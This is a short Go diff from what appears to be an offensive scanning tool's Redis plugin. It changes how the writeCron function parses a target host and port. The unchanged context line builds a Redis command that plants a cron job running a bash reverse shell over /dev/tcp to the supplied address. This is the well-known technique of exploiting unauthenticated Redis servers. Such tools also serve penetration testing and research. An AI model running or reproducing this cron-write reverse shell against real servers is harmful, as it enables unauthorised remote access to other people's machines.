@@ -594,11 +594,15 @@ func (p *RedisPlugin) writeCron(conn net.Conn, host string) (flag bool, text str
 	}
 
 	// 解析目标地址
-	target := strings.Split(host, ":")
-	if len(target) < 2 {
+	scanIp, scanPort, err := net.SplitHostPort(strings.TrimSpace(host))
+	if err != nil && strings.Count(host, ":") == 1 {
+		target := strings.SplitN(host, ":", 2)
+		scanIp, scanPort = strings.TrimSpace(target[0]), strings.TrimSpace(target[1])
+		err = nil
+	}
+	if err != nil || scanIp == "" || scanPort == "" {
 		return false, i18n.GetText("redis_host_format_invalid"), nil
 	}
-	scanIp, scanPort := target[0], target[1]
 
 	// 写入cron任务
 	cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)
